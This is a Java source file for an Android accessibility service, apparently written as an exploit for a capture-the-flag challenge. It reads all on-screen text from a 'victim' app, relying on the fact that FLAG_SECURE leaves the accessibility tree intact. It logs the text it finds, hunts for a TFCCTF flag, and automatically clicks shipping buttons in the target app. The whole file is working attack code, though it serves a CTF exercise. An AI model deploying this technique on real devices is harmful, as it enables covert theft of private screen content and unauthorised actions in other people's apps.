package ctf.probe;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * Reads the victim's window content.  FLAG_SECURE does not strip the accessibility node
 * tree, and MainActivity.createPackageCard puts the shipment name straight into a TextView.
 */
public class Grab extends AccessibilityService {

    static volatile boolean flagFound = false;
    private final Set<String> seen = new HashSet<String>();
    private int scans = 0;
    private int logged = 0;

    @Override
    protected void onServiceConnected() {
        L.s("A11Y CONNECTED");
        try {
            AccessibilityServiceInfo i = new AccessibilityServiceInfo();
            i.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
            i.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
            i.flags = AccessibilityServiceInfo.DEFAULT
                    | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
                    | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                    | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
            i.notificationTimeout = 0;
            setServiceInfo(i);
        } catch (Throwable t) {
            L.s("setServiceInfo " + t);
        }
        final Handler h = new Handler(Looper.getMainLooper());
        h.postDelayed(new Runnable() {
            @Override
            public void run() {
                scans++;
                scan();
                if (scans < 55) h.postDelayed(this, 800);
            }
        }, 400);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {
        scan();
    }

    @Override
    public void onInterrupt() {
    }

    private void scan() {
        try {
            walk(getRootInActiveWindow(), 0);
            List<AccessibilityWindowInfo> ws = getWindows();
            if (ws != null) {
                for (AccessibilityWindowInfo w : ws) {
                    if (w != null) walk(w.getRoot(), 0);
                }
            }
        } catch (Throwable ignored) {
        }
    }

    private void walk(AccessibilityNodeInfo n, int d) {
        if (n == null || d > 25) return;
        try {
            emit(n.getText());
            emit(n.getContentDescription());
            // Only start clicking once passive reading has clearly not produced the flag.
            if (scans >= 5 && !flagFound) {
                CharSequence t = n.getText();
                if (t != null) {
                    String s = t.toString();
                    if (("Mark as shipped".equals(s) || "Get shipping label".equals(s))
                            && n.isClickable()) {
                        boolean ok = n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        L.s("CLICK '" + s + "' -> " + ok);
                    }
                }
            }
            int c = n.getChildCount();
            for (int i = 0; i < c; i++) walk(n.getChild(i), d + 1);
        } catch (Throwable ignored) {
        }
    }

    private void emit(CharSequence cs) {
        if (cs == null) return;
        String s = cs.toString();
        if (s.length() == 0) return;
        if (s.contains("TFCCTF")) {
            if (seen.add("F:" + s)) L.s("FLAG>>> " + s);
            flagFound = true;
            return;
        }
        if (logged < 45 && seen.add(s)) {
            logged++;
            L.s("node: " + s);
        }
    }
}
